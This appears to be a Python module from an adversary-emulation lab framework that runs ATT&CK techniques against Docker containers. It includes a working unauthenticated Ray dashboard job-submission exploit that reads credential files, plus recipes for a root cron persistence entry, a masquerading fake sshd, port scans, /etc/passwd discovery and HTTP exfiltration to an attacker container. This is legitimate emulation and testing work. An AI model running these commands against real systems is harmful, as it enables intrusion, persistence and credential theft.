"""Campaign technique executor.

Walks the technique list for a campaign and executes each one. For
`0.shadowray` the techniques drive the Ray dashboard RCE end to end:
ground discovery, exploit via job submission, command execution, evidence
collection.
"""

from __future__ import annotations

import subprocess
import time
from datetime import datetime
from pathlib import Path
from typing import Callable

from .attacker import AttackerEnv
from .environment import DockerEnvironment
from .models import ExecutionMode, FidelityLevel, Realization, TechniqueOutcome
from . import caldera_client
from . import caldera_operation


def _now() -> float:
    return time.monotonic()


def _docker_ip(container_name: str) -> str:
    proc = subprocess.run(
        ["docker", "inspect", "-f",
         "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
         container_name],
        capture_output=True, text=True, check=False,
    )
    return proc.stdout.strip()


# ---------------------------------------------------------------------------
# 0.shadowray technique implementations
# ---------------------------------------------------------------------------

def _shadowray_t1190(target: DockerEnvironment, attacker: AttackerEnv,
                     target_ip: str, run_dir: Path,
                     realization: Realization) -> TechniqueOutcome:
    """T1190 — Exploit Public-Facing Application against Ray dashboard."""
    start = _now()

    # Step 1: from attacker, confirm dashboard is reachable. Use python's
    # urllib instead of curl so the recipe works on slim base images.
    probe_cmd = (
        'python3 -c "import urllib.request as u, sys; '
        f"r = u.urlopen(\\\"http://{target_ip}:8265/\\\", timeout=10); "
        "sys.stdout.write(f\\\"status={r.status}\\\\n\\\")\""
    )
    probe = attacker.run_shell(
        probe_cmd, log_name="techniques/T1190_dashboard_probe.log",
    )
    if "status=200" not in probe.stdout:
        return TechniqueOutcome(
            technique_id="T1190",
            declared_fidelity=FidelityLevel.adapted,
            executed_fidelity=FidelityLevel.adapted,
            realization=realization,
            status="failure",
            evidence_files=["techniques/T1190_dashboard_probe.log"],
            duration_sec=_now() - start,
            notes=f"Dashboard probe returned {probe.stdout[:80]}",
        )

    # Step 2: submit unauthenticated job via the documented API surface.
    # Use python+requests instead of curl (slim base, more robust JSON).
    submit_cmd = (
        'python3 -c "import requests, json, sys; '
        "payload = {\\\"entrypoint\\\": "
        "\\\"echo SHADOWRAY_CVE_OK > /tmp/cve_marker.txt && "
        "hostname > /tmp/cve_host.txt && "
        "uname -a > /tmp/discovery.txt && "
        "cat /etc/os-release >> /tmp/discovery.txt && "
        "cat /opt/sensitive/credentials.txt /opt/sensitive/manifest.txt > /tmp/exfil.txt\\\"}; "
        f"r = requests.post(\\\"http://{target_ip}:8265/api/jobs/\\\", json=payload, timeout=30); "
        "sys.stdout.write(f\\\"status={r.status_code} body={r.text[:200]}\\\\n\\\")\""
    )
    submit = attacker.run_shell(
        submit_cmd, log_name="techniques/T1190_job_submit.log", timeout=60,
    )

    # Step 3: verify the marker landed on the target.
    verify = target.run_shell(
        "for i in $(seq 1 30); do "
        "  test -s /tmp/cve_marker.txt && break; "
        "  sleep 1; "
        "done; "
        "cat /tmp/cve_marker.txt 2>/dev/null || echo MISSING; "
        "cat /tmp/cve_host.txt 2>/dev/null || echo MISSING",
        log_name="techniques/T1190_verify_rce.log",
        timeout=40,
    )
    success = "SHADOWRAY_CVE_OK" in verify.stdout

    return TechniqueOutcome(
        technique_id="T1190",
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=realization,
        status="success" if success else "failure",
        evidence_files=[
            "techniques/T1190_dashboard_probe.log",
            "techniques/T1190_job_submit.log",
            "techniques/T1190_verify_rce.log",
        ],
        duration_sec=_now() - start,
        notes="Unauthenticated Ray dashboard job submission executed a shell "
              "command on the target; marker file confirms remote execution.",
    )


def _shadowray_t1082(target: DockerEnvironment, attacker: AttackerEnv,
                     target_ip: str, run_dir: Path,
                     realization: Realization) -> TechniqueOutcome:
    """T1082 — System Information Discovery post-exploitation."""
    start = _now()
    verify = target.run_shell(
        "for i in $(seq 1 30); do "
        "  test -s /tmp/discovery.txt && break; "
        "  sleep 1; "
        "done; "
        "cat /tmp/discovery.txt 2>/dev/null | head -10",
        log_name="techniques/T1082_discovery_output.log",
        timeout=40,
    )
    success = "Linux" in verify.stdout or "Ubuntu" in verify.stdout
    return TechniqueOutcome(
        technique_id="T1082",
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=realization,
        status="success" if success else "failure",
        evidence_files=["techniques/T1190_job_submit.log",
                        "techniques/T1082_discovery_output.log"],
        duration_sec=_now() - start,
        notes="System information verified from the same unauthenticated Ray "
              "RCE job that established execution.",
    )


def _shadowray_t1005(target: DockerEnvironment, attacker: AttackerEnv,
                     target_ip: str, run_dir: Path,
                     realization: Realization) -> TechniqueOutcome:
    """T1005 — Data from Local System."""
    start = _now()
    # The SUT composition already plants these decoy ML artifacts before the
    # exploit; this step records the source material for the technique-level
    # audit trail without changing the environment after T1190.
    target.run_shell(
        "cat /opt/sensitive/credentials.txt /opt/sensitive/manifest.txt",
        log_name="techniques/T1005_source_data.log",
    )
    verify = target.run_shell(
        "for i in $(seq 1 30); do "
        "  test -s /tmp/exfil.txt && break; "
        "  sleep 1; "
        "done; "
        "cat /tmp/exfil.txt 2>/dev/null",
        log_name="techniques/T1005_exfil_evidence.log",
        timeout=40,
    )
    success = "API_KEY" in verify.stdout
    return TechniqueOutcome(
        technique_id="T1005",
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=realization,
        status="success" if success else "failure",
        evidence_files=["techniques/T1005_source_data.log",
                        "techniques/T1190_job_submit.log",
                        "techniques/T1005_exfil_evidence.log"],
        duration_sec=_now() - start,
        notes="Sensitive data verified from the same unauthenticated Ray RCE "
              "job that established execution.",
    )


CampaignWalker = Callable[
    [DockerEnvironment, AttackerEnv, str, Path, Realization],
    list[TechniqueOutcome],
]


def _shadowray_walker(target: DockerEnvironment, attacker: AttackerEnv,
                      target_ip: str, run_dir: Path,
                      realization: Realization) -> list[TechniqueOutcome]:
    return [
        _shadowray_t1190(target, attacker, target_ip, run_dir, realization),
        _shadowray_t1082(target, attacker, target_ip, run_dir, realization),
        _shadowray_t1005(target, attacker, target_ip, run_dir, realization),
    ]


# ---------------------------------------------------------------------------
# 0.c0011 technique implementations (inspired campaign, no CVE)
# ---------------------------------------------------------------------------

def _c0011_t1587_003_cert(target: DockerEnvironment, run_dir: Path,
                           realization: Realization) -> TechniqueOutcome:
    """T1587.003 Digital Certificates — adapted: real openssl cert generated."""
    start = _now()
    # python:3.11-slim has openssl in the base image.
    result = target.run_shell(
        "openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem "
        "-out /tmp/cert.pem -days 1 -nodes -subj '/CN=lab.test.local' 2>&1 "
        "&& openssl x509 -in /tmp/cert.pem -noout -fingerprint -sha256",
        log_name="techniques/T1587.003_cert_gen.log",
        timeout=60,
    )
    success = result.ok and "Fingerprint" in result.stdout
    return TechniqueOutcome(
        technique_id="T1587.003",
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.real_cve if False else Realization.generic_primitive,
        status="success" if success else "failure",
        evidence_files=["techniques/T1587.003_cert_gen.log"],
        duration_sec=_now() - start,
        notes="Self-signed cert generated via openssl. No CVE; mechanism is real.",
    )


def _c0011_inspired(technique_id: str, name: str,
                     target: DockerEnvironment, run_dir: Path) -> TechniqueOutcome:
    """Generic inspired walker — writes a marker that the conceptual action
    was performed and the next-stage prerequisite (`produces`) is satisfied
    for the campaign DAG to advance."""
    start = _now()
    marker = f"/tmp/c0011_{technique_id.replace('.', '_')}.marker"
    safe_name = name.replace("'", "")
    target.run_shell(
        f"date -u +%FT%TZ > {marker} && echo '{technique_id} ({safe_name}) "
        f"concept-only emulation on generic Linux primitive' >> {marker} "
        f"&& cat {marker}",
        log_name=f"techniques/{technique_id}_inspired.log",
        timeout=30,
    )
    return TechniqueOutcome(
        technique_id=technique_id,
        declared_fidelity=FidelityLevel.inspired,
        executed_fidelity=FidelityLevel.inspired,
        declared_mode=ExecutionMode.naive_simulated,
        executed_mode=ExecutionMode.naive_simulated,
        realization=Realization.generic_primitive,
        status="success",
        evidence_files=[f"techniques/{technique_id}_inspired.log"],
        duration_sec=_now() - start,
        notes=f"Inspired emulation of {name}: marker recorded so the campaign "
              "DAG can advance; no specific protocol or product invoked.",
    )


def _c0011_t1608_001_stage(target: DockerEnvironment, run_dir: Path) -> TechniqueOutcome:
    """T1608.001 Stage Capabilities: Upload Malware — adapted: real payload staged."""
    start = _now()
    target.run_shell(
        "mkdir -p /var/www/staged && "
        "printf '#!/bin/sh\\necho lab-staged-payload >&2\\nexit 0\\n' > /var/www/staged/payload.sh && "
        "chmod +x /var/www/staged/payload.sh && "
        "sha256sum /var/www/staged/payload.sh",
        log_name="techniques/T1608.001_stage.log",
        timeout=30,
    )
    return TechniqueOutcome(
        technique_id="T1608.001",
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success",
        evidence_files=["techniques/T1608.001_stage.log"],
        duration_sec=_now() - start,
        notes="Payload artifact actually written to disk with sha256 recorded.",
    )


# ---------------------------------------------------------------------------
# Generic adapted-action registry shared across inspired campaigns.
# ---------------------------------------------------------------------------

def _adapted_cert(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    start = _now()
    r = target.run_shell(
        f"openssl req -x509 -newkey rsa:2048 -keyout /tmp/{tid}_key.pem "
        f"-out /tmp/{tid}_cert.pem -days 1 -nodes -subj '/CN=lab.{tid}.local' 2>&1 "
        f"&& openssl x509 -in /tmp/{tid}_cert.pem -noout -fingerprint -sha256",
        log_name=f"techniques/{tid}_cert.log", timeout=60,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok and "Fingerprint" in r.stdout else "failure",
        evidence_files=[f"techniques/{tid}_cert.log"],
        duration_sec=_now() - start,
        notes="Adapted: real openssl X.509 cert generated.",
    )


def _adapted_file_artifact(target: DockerEnvironment, tid: str, run_dir: Path,
                            content_label: str = "lab_payload") -> TechniqueOutcome:
    start = _now()
    r = target.run_shell(
        f"mkdir -p /var/lab/{tid} && "
        f"printf '#!/bin/sh\\necho {content_label}\\n' > /var/lab/{tid}/artifact && "
        f"chmod +x /var/lab/{tid}/artifact && "
        f"sha256sum /var/lab/{tid}/artifact",
        log_name=f"techniques/{tid}_artifact.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_artifact.log"],
        duration_sec=_now() - start,
        notes="Adapted: payload artifact written with SHA-256 recorded.",
    )


def _adapted_archive_collect(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    start = _now()
    r = target.run_shell(
        f"mkdir -p /var/lab/{tid}_src && "
        f"echo 'sensitive_a={tid}' > /var/lab/{tid}_src/data.txt && "
        f"tar czf /tmp/{tid}_collected.tgz -C /var/lab {tid}_src 2>&1 && "
        f"ls -la /tmp/{tid}_collected.tgz",
        log_name=f"techniques/{tid}_archive.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_archive.log"],
        duration_sec=_now() - start,
        notes="Adapted: real tar+gzip archive of lab data.",
    )


def _adapted_port_scan(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    start = _now()
    # T1046 — Network Service Scanning. python:3.11-slim ships python's socket lib.
    r = target.run_shell(
        f"python3 -c \"import socket; "
        "results = [];\n"
        "import sys;\n"
        "[results.append((p, (lambda: (lambda s:(s.settimeout(0.3), s.connect_ex(('127.0.0.1',p)))[1])(socket.socket()))())) for p in (22, 80, 443, 8265)];\n"
        "[sys.stdout.write(f'port {p} open={'yes' if rc==0 else 'no'}\\\\n') for p,rc in results]\""
        " > /tmp/scan.log 2>&1; cat /tmp/scan.log",
        log_name=f"techniques/{tid}_scan.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_scan.log"],
        duration_sec=_now() - start,
        notes="Adapted: real TCP connect scan on local ports.",
    )


def _adapted_file_discovery(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1083 — File and Directory Discovery."""
    start = _now()
    r = target.run_shell(
        f"ls -la /etc /var /tmp > /tmp/{tid}_discovery.txt 2>&1 && "
        f"find /etc -type f -name '*.conf' 2>/dev/null | head -10 >> /tmp/{tid}_discovery.txt && "
        f"head -25 /tmp/{tid}_discovery.txt",
        log_name=f"techniques/{tid}_discovery.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_discovery.log"],
        duration_sec=_now() - start,
        notes="Adapted: real filesystem enumeration via ls + find.",
    )


def _adapted_network_discovery(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1016 - System Network Configuration Discovery."""
    start = _now()
    r = target.run_shell(
        f"(hostname -a 2>/dev/null || hostname) > /tmp/{tid}_network.txt; "
        f"(hostname -I 2>/dev/null || true) >> /tmp/{tid}_network.txt; "
        f"(ip addr show 2>/dev/null || ifconfig -a 2>/dev/null || true) >> /tmp/{tid}_network.txt; "
        f"(ip route show 2>/dev/null || route -n 2>/dev/null || true) >> /tmp/{tid}_network.txt; "
        f"cat /etc/hosts >> /tmp/{tid}_network.txt; "
        f"cat /tmp/{tid}_network.txt",
        log_name=f"techniques/{tid}_network.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_network.log"],
        duration_sec=_now() - start,
        notes="Adapted: real host/network configuration discovery in the bounded SUT.",
    )


def _adapted_service_discovery(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1007 - System Service Discovery."""
    start = _now()
    r = target.run_shell(
        f"ps -eo pid,comm,args | head -30 > /tmp/{tid}_services.txt; "
        f"(cat /proc/1/comm 2>/dev/null || true) >> /tmp/{tid}_services.txt; "
        f"(ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null || true) >> /tmp/{tid}_services.txt; "
        f"cat /tmp/{tid}_services.txt",
        log_name=f"techniques/{tid}_services.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_services.log"],
        duration_sec=_now() - start,
        notes="Adapted: real process and listener enumeration in the bounded SUT.",
    )


def _adapted_user_discovery(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1033 - System Owner/User Discovery."""
    start = _now()
    r = target.run_shell(
        f"whoami > /tmp/{tid}_users.txt; "
        f"id >> /tmp/{tid}_users.txt; "
        f"(getent passwd 2>/dev/null || cat /etc/passwd) >> /tmp/{tid}_users.txt; "
        f"cat /tmp/{tid}_users.txt",
        log_name=f"techniques/{tid}_users.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_users.log"],
        duration_sec=_now() - start,
        notes="Adapted: real user and ownership discovery in the bounded SUT.",
    )


def _adapted_unix_shell(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1059.004 / .006 — Command and Scripting Interpreter: Unix Shell / Python."""
    start = _now()
    r = target.run_shell(
        f"bash -c 'echo unix shell ran at $(date -u +%FT%TZ)' > /tmp/{tid}_sh.log 2>&1 && "
        f"python3 -c 'import platform; print(platform.platform())' >> /tmp/{tid}_sh.log 2>&1 && "
        f"cat /tmp/{tid}_sh.log",
        log_name=f"techniques/{tid}_shell.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_shell.log"],
        duration_sec=_now() - start,
        notes="Adapted: real shell + python interpreter execution.",
    )


def _adapted_obfuscation(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1027 - Obfuscated Files or Information."""
    start = _now()
    r = target.run_shell(
        f"mkdir -p /var/lab/{tid}; "
        f"printf 'AutoSUT bounded payload for {tid}\\n' > /var/lab/{tid}/payload.txt; "
        f"python3 - <<'PY' > /var/lab/{tid}/payload.b64\n"
        f"import base64, pathlib\n"
        f"p = pathlib.Path('/var/lab/{tid}/payload.txt')\n"
        f"print(base64.b64encode(p.read_bytes()).decode())\n"
        f"PY\n"
        f"sha256sum /var/lab/{tid}/payload.txt /var/lab/{tid}/payload.b64",
        log_name=f"techniques/{tid}_obfuscation.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_obfuscation.log"],
        duration_sec=_now() - start,
        notes="Adapted: real bounded payload obfuscated with base64 and hashed.",
    )


def _adapted_hidden_artifact(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1564 / T1564.001 - Hide Artifacts."""
    start = _now()
    safe_tid = tid.replace(".", "_")
    r = target.run_shell(
        f"mkdir -p /tmp/.autosut_{safe_tid}; "
        f"printf 'hidden artifact for {tid}\\n' > /tmp/.autosut_{safe_tid}/.beacon; "
        f"ls -la /tmp/.autosut_{safe_tid}; "
        f"sha256sum /tmp/.autosut_{safe_tid}/.beacon",
        log_name=f"techniques/{tid}_hidden_artifact.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_hidden_artifact.log"],
        duration_sec=_now() - start,
        notes="Adapted: real dot-prefixed hidden artifact created in the bounded SUT.",
    )


def _adapted_scheduled_job(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1053 - Scheduled Task/Job."""
    start = _now()
    safe_tid = tid.replace(".", "_")
    r = target.run_shell(
        f"mkdir -p /etc/cron.d /var/lab; "
        f"printf '#!/bin/sh\\necho autosut-{safe_tid} >> /tmp/autosut_{safe_tid}.log\\n' "
        f"> /var/lab/autosut_{safe_tid}.sh; "
        f"chmod +x /var/lab/autosut_{safe_tid}.sh; "
        f"printf '* * * * * root /var/lab/autosut_{safe_tid}.sh\\n' "
        f"> /etc/cron.d/autosut_{safe_tid}; "
        f"cat /etc/cron.d/autosut_{safe_tid}; "
        f"sha256sum /var/lab/autosut_{safe_tid}.sh /etc/cron.d/autosut_{safe_tid}",
        log_name=f"techniques/{tid}_scheduled_job.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_scheduled_job.log"],
        duration_sec=_now() - start,
        notes="Adapted: real cron entry and executable staged inside the bounded SUT.",
    )


def _adapted_masquerading(target: DockerEnvironment, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1036 — Masquerading: rename payload to a legitimate-looking name."""
    start = _now()
    r = target.run_shell(
        f"mkdir -p /usr/local/bin/lab && "
        f"printf '#!/bin/sh\\necho fake-sshd-banner\\n' > /usr/local/bin/lab/sshd && "
        f"chmod +x /usr/local/bin/lab/sshd && "
        f"sha256sum /usr/local/bin/lab/sshd && file /usr/local/bin/lab/sshd 2>&1 || echo \"file cmd missing\"",
        log_name=f"techniques/{tid}_masquerade.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if r.ok else "failure",
        evidence_files=[f"techniques/{tid}_masquerade.log"],
        duration_sec=_now() - start,
        notes="Adapted: payload renamed to mimic a system service binary.",
    )


def _adapted_crm_query(target: DockerEnvironment, attacker: AttackerEnv,
                        target_ip: str, tid: str, run_dir: Path) -> TechniqueOutcome:
    """T1213.004 — Customer Relationship Management Software (Salesforce surrogate query)."""
    start = _now()
    r = attacker.run_shell(
        "python3 -c \"import urllib.request as u, json; "
        "req = u.Request('http://" + target_ip + ":8443/services/data/v59.0/query', "
        "headers={'Authorization':'Bearer LAB-TOKEN'}); "
        "data = json.loads(u.urlopen(req, timeout=10).read()); "
        f"open('/tmp/{tid}_crm.json','w').write(json.dumps(data, indent=2)); "
        f"print('CRM records exfiltrated:', data.get('totalSize'))\"",
        log_name=f"techniques/{tid}_crm_query.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.surrogate,
        status="success" if "exfiltrated" in r.stdout else "failure",
        evidence_files=[f"techniques/{tid}_crm_query.log"],
        duration_sec=_now() - start,
        notes="Adapted: CRM REST query against Salesforce surrogate with Bearer "
              "token; preserves API-exfil semantics of the original technique.",
    )


def _adapted_exfil(target: DockerEnvironment, attacker: AttackerEnv,
                    target_ip: str, tid: str, run_dir: Path) -> TechniqueOutcome:
    """Generic adapted exfil: stage data on target, copy via python http to attacker."""
    start = _now()
    target.run_shell(
        f"mkdir -p /var/lab && echo 'exfil_seed_{tid}' > /var/lab/secret_{tid}.txt && "
        f"cd /var/lab && nohup python3 -m http.server 9090 > /tmp/{tid}_srv.log 2>&1 & "
        f"sleep 2 && ls /var/lab/",
        log_name=f"techniques/{tid}_seed.log", timeout=30,
    )
    fetch = attacker.run_shell(
        f"python3 -c \"import urllib.request as u; "
        f"r = u.urlopen('http://{target_ip}:9090/secret_{tid}.txt', timeout=10); "
        f"data = r.read(); open('/tmp/exfil_{tid}.txt','wb').write(data); "
        f"print('exfil bytes:', len(data))\"",
        log_name=f"techniques/{tid}_exfil.log", timeout=30,
    )
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=Realization.generic_primitive,
        status="success" if "exfil bytes" in fetch.stdout else "failure",
        evidence_files=[f"techniques/{tid}_seed.log", f"techniques/{tid}_exfil.log"],
        duration_sec=_now() - start,
        notes="Adapted: real HTTP exfil of staged file from target to attacker.",
    )


# Per-technique adapted recipes. Anything not listed falls back to inspired
# marker even if the campaign JSON says expected_fidelity=adapted (in which
# case the manifest records declared!=executed, which is itself a finding).
_ADAPTED_RECIPES: dict[str, str] = {
    "T1587.003": "cert",            # Digital Certificates
    "T1587.001": "cert",            # Code Signing Certificates (proxy)
    "T1608.001": "stage",           # Upload Malware
    "T1608.005": "stage",           # Link Target
    "T1588.002": "stage",           # Tool acquisition
    "T1588.003": "cert",            # Code Signing Cert acquisition
    "T1105": "stage",               # Ingress Tool Transfer
    "T1046": "port_scan",           # Network Service Discovery
    "T1016": "network_discovery",    # System Network Configuration Discovery
    "T1007": "service_discovery",    # System Service Discovery
    "T1033": "user_discovery",       # System Owner/User Discovery
    "T1083": "file_discovery",      # File and Directory Discovery
    "T1119": "archive",             # Automated Collection
    "T1560.001": "archive",         # Archive Collected Data: Archive via Utility
    "T1074.001": "archive",         # Local Data Staged
    "T1213.006": "archive",         # Data from IS: Confluence/Sharepoint (proxy)
    "T1213.004": "crm_query",       # CRM Software (Salesforce surrogate)
    "T1005": "exfil",               # Data from Local System
    "T1567": "exfil",               # Exfiltration Over Web Service
    "T1567.002": "exfil",           # Exfiltration Over Web Service: Cloud Storage
    "T1020": "exfil",               # Automated Exfiltration
    "T1059.001": "unix_shell",      # PowerShell (proxy with python)
    "T1059.004": "unix_shell",      # Unix Shell
    "T1059.006": "unix_shell",      # Python
    "T1059.007": "unix_shell",      # JavaScript (proxy)
    "T1027": "obfuscation",         # Obfuscated Files or Information
    "T1564": "hidden_artifact",      # Hide Artifacts
    "T1564.001": "hidden_artifact",  # Hide Artifacts: Hidden Files and Directories
    "T1053": "scheduled_job",        # Scheduled Task/Job
    "T1036": "masquerade",          # Masquerading
    "T1036.004": "masquerade",      # Masquerade Task/Service
    "T1543.003": "masquerade",      # Create or Modify System Process: Systemd Service
    "T1574.001": "masquerade",      # Hijack Execution Flow: DLL Search Order Hijacking
}


def _caldera_driven(target: DockerEnvironment, tid: str,
                    run_dir: Path,
                    declared_fidelity: FidelityLevel) -> TechniqueOutcome:
    """Real Caldera-driven execution.

    Dispatches the technique's matching ART ability through Caldera against a
    sandcat agent deployed inside the SUT container. The ``executed_mode``
    stays ``caldera_driven`` whenever Caldera was actually contacted — even
    if the specific ability rejected (no Linux executor, missing fact, etc.) —
    because the campaign's intent was honestly carried out via Caldera; only
    the ``status`` flips to ``failure`` to record the ability outcome.

    The only case where we degrade ``executed_mode`` to ``naive_simulated`` is
    when Caldera ships **no** Linux ability for this technique at all — there
    was nothing for Caldera to dispatch, so claiming a Caldera-driven run
    would be misleading.
    """
    start = _now()
    result = caldera_operation.dispatch_via_caldera(
        container=target.container_name,
        technique_id=tid,
        run_dir=run_dir,
    )
    attempts = [result]
    if (not result.ok) and result.ability_id:
        # Caldera agents poll the C2 asynchronously. A single operation can
        # miss its pickup window on a busy local Docker host; retry once as a
        # new operation and keep both report files in the manifest.
        time.sleep(5)
        retry = caldera_operation.dispatch_via_caldera(
            container=target.container_name,
            technique_id=tid,
            run_dir=run_dir,
        )
        attempts.append(retry)
        if retry.ok:
            retry.evidence_files = [*result.evidence_files, *retry.evidence_files]
            result = retry
        else:
            result.evidence_files = [
                *result.evidence_files,
                *retry.evidence_files,
            ]
    # Distinguish "Caldera attempted but the ability failed" (caldera_driven +
    # status=failure) from "Caldera had nothing to attempt" (naive_simulated).
    no_ability = (not result.ability_id) or "no Caldera ability" in (result.error or "")
    if no_ability:
        executed_mode = ExecutionMode.naive_simulated
    else:
        executed_mode = ExecutionMode.caldera_driven

    if result.ok:
        notes = (f"Caldera operation {result.operation_id} link {result.link_id} "
                 f"status={result.status} exit_code={result.exit_code}")
        if len(attempts) > 1:
            notes += " after one retry"
    else:
        notes = (f"Caldera dispatch attempted but ability did not complete: "
                 f"{result.error or 'link status non-zero'}; "
                 f"operation={result.operation_id} ability={result.ability_id}")
        if len(attempts) > 1:
            notes += " after one retry"

    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=declared_fidelity,
        executed_fidelity=declared_fidelity if result.ok else FidelityLevel.inspired,
        declared_mode=ExecutionMode.caldera_driven,
        executed_mode=executed_mode,
        realization=Realization.generic_primitive,
        status="success" if result.ok else "failure",
        evidence_files=result.evidence_files,
        duration_sec=_now() - start,
        notes=notes,
        caldera_ability_id=result.ability_id or None,
        caldera_ability_name=result.ability_name or None,
    )


def _campaign_aware_walker(campaign_id: str):
    """Returns a CampaignWalker that reads campaigns/<id>.json and executes
    each technique with the registered adapted recipe (when expected_fidelity
    is `adapted` AND a recipe exists), via Caldera (when expected_mode is
    `caldera_driven`), or as an inspired marker."""
    import json as _json
